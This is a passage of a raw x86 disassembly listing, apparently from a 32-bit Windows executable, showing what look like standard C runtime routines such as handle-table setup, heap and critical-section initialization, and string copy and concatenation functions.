  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
